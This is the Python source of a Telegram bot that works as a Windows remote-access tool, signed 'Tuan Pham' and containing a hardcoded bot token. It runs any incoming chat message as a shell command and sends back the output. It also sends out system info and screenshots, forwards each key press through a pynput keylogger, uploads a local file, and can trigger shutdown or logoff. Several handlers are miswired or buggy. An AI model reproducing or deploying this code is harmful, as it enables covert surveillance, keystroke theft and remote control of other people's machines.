import subprocess
import telebot
import emoji
import pynput
	# import keyboard
import datetime
	# import datetime
from pynput.keyboard import Key, Controller
import schedule
import threading
import matplotlib.pyplot as plt
import numpy as np
import pyautogui
import colored
import pyfiglet
from colorama import Fore
from colorama import Style

bot = telebot.TeleBot("1764092484:AAFH54usSJHnb36qu0xTIvbamqBVXEggnc0")
telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'}
chat_id=990978363
# ---------------------------------------------------------------------------

def console(a):
	split=a.split(" ")
	try:
		bot.send_message(chat_id,(subprocess.run(split, stdout=subprocess.PIPE)).stdout.decode())
	except:
		bot.send_message(chat_id,"Nhập lại đi, sai cmnr :(( .Mà cũng có thể là nó dài quá. Nó không show được")
def send_system():
	system = subprocess.run(["systeminfo"], stdout=subprocess.PIPE)
	# print((system.stdout).decode())
	return ((system.stdout).decode())
def get_host_name():
	icon=emoji.emojize('⛔',language='es')
	hostname = subprocess.run(["hostname"], stdout=subprocess.PIPE)
	return hostname.stdout.decode()
def send_notify():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" ["+datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"]"+'\n'+" Have connected from "+get_host_name()
	bot.send_message(chat_id,notify)
def shutdown():
	shut = subprocess.run(["shutdown","/s"], stdout=subprocess.PIPE)
	return ((shut.stdout).decode())
def Restart():
	restart = subprocess.run(["shutdown","/r"], stdout=subprocess.PIPE)
	return ((restart.stdout).decode())
def log():
	Log = subprocess.run(["shutdown","/l"], stdout=subprocess.PIPE)
	return ((Log.stdout).decode())
def send_notify_send_files():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" sendingggg, pls wait.. "
	bot.send_message(chat_id,notify)
def send_file():
	bot.send_document(chat_id, "C:/Users/tuanpa48/Desktop/test.txt")

def on_press(key):
	bot.send_message(chat_id, '{0}'.format(key))

def Listener():
	keyboard=pynput()
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
	listener = keyboard.Listener(on_press=on_press)
	listener.stop()

# def send_notify_1():
# 	print("them")
#
# 	bot.send_message(chat_id, "huhuhu")
#
# def set_time():
# 	schedule.every(10).seconds.do(send_notify_1)
# 	while True:
# 		schedule.run_pending()
def dothi(message,x):
	a = []
	b = []
	bieuthuc = ""
	a = message.split(" ",1)
	b = a[1].split(' ')
	for i in range(len(b)):
		b[i] = int(b[i])
	for i in range(len(b)):
		if i != len(b) - 1 and i !=len(b)-2:
			bieuthuc = bieuthuc + str(b[i]) + "x^" + str(len(b) - i - 1) + " + "
		if i== len(b) -2 :
			bieuthuc=bieuthuc + str(b[i]) + "x" + " + "
		if i == len(b) - 1:
			bieuthuc = bieuthuc + str(b[len(b) - 1])
	bot.send_message(chat_id,"Đồ thị hàm số " +"\n"+"y = "+bieuthuc)
	y=0
	for i in range(len(b)):
		y= y+ b[i]*x**(len(b)-i-1)
	return y

def sceenshot():
	a="screenshot_"+datetime.now().strftime("%d%m%Y_%H%M%S")+".jpg"
	shot=pyautogui.screenshot(a)
	bot.send_photo(chat_id,photo=open(a,'rb'))

# ---------------------------------------------------------------------------
@bot.message_handler(commands=['ipconfig'] )
def send_ipconfig(message):
	bot.send_message(chat_id,console('ipconfig'))


@bot.message_handler(commands=['sys'] )
def send_system_run(message):
	bot.send_message(chat_id,send_system())


@bot.message_handler(commands=['monitor'] )
def send_system_run(message):
	bot.send_message(chat_id,Listener())


@bot.message_handler(commands=['shutdowm'] )
def send_system_run(message):
	Listener()


@bot.message_handler(commands=['restart'] )
def send_system_run(message):
	bot.send_message(chat_id,Listener())


@bot.message_handler(commands=['log'] )
def send_system_run(message):
	bot.send_message(chat_id,Listener())


@bot.message_handler(commands=['screen'] )
def send_system_run(message):
	sceenshot()
	# code dùng để gửi ảnh viết vào đây

@bot.message_handler(commands=['math'] )
def chart_math(message):
	y=[]
	x=np.linspace(-10,10,16)
	y=dothi(message.text,x)
	plt.plot(x,y)
	# plt.show()
	a = "Chart_math" + datetime.now().strftime("%d%m%Y_%H%M%S") + ".png"
	plt.savefig(a)
	bot.send_photo(chat_id, photo=open(a, 'rb'))





@bot.message_handler(func=lambda message: True)
def send_sonsole(message):
	if (message.text != '/test'):
		print(message.text)
		console(message.text)

# ---------------------------------------------------------------------------

if __name__== '__main__':
	ascii_banner = pyfiglet.figlet_format("Telegram Bot")
	print(f'{Fore.LIGHTGREEN_EX}'+ascii_banner)
	print(f'{Fore.RED}'+"                     By Tuan Pham v.10")
	send_notify()
	# threading.Thread(target=plt.show()).start()
	threading.Thread(target=bot.polling()).start()
	# bot.polling()
